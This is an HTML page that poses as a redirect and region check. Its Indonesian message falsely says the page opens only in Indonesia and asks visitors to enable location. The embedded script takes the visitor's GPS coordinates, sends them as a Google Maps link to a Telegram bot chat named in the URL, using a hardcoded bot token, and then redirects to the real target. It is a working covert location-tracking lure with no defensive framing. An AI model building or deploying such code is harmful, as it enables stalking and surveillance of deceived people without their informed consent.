<!DOCTYPE html>
<html>
<head>
    <title>Redirect...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
        }
        p {
            font-size: 18px;
        }
    </style>
    <script>
        const BOT_TOKEN = "8466065352:AAHRmeCDR9R5UEBk1MQ5seUw-NCu1QOLs9A";

        function sendLocation(chatId, targetUrl) {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(position => {
                    let lat = position.coords.latitude;
                    let lon = position.coords.longitude;
                    let locationMsg = `📍 Lokasi: https://www.google.com/maps?q=${lat},${lon}`;
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(locationMsg)}`)
                        .then(() => {
                            window.location.href = targetUrl;
                        });
                }, () => {
                    window.location.href = targetUrl;
                });
            } else {
                window.location.href = targetUrl;
            }
        }

        window.onload = () => {
            const params = new URLSearchParams(window.location.search);
            let chatId = params.get("chatid");
            let target = params.get("target");

            if (chatId && target) {
                document.getElementById("message").innerText = "Halaman ini hanya bisa dibuka di Indonesia, untuk mengetahui lokasi anda maka nyalakan lokasi.";
                // Langsung minta lokasi
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(() => {
                        sendLocation(chatId, decodeURIComponent(target));
                    }, () => {
                        window.location.href = decodeURIComponent(target);
                    });
                }
            } else {
                document.body.innerHTML = "<h3>Link tidak valid</h3>";
            }
        };
    </script>
</head>
<body>
    <p id="message">Sedang memproses...</p>
</body>
</html>
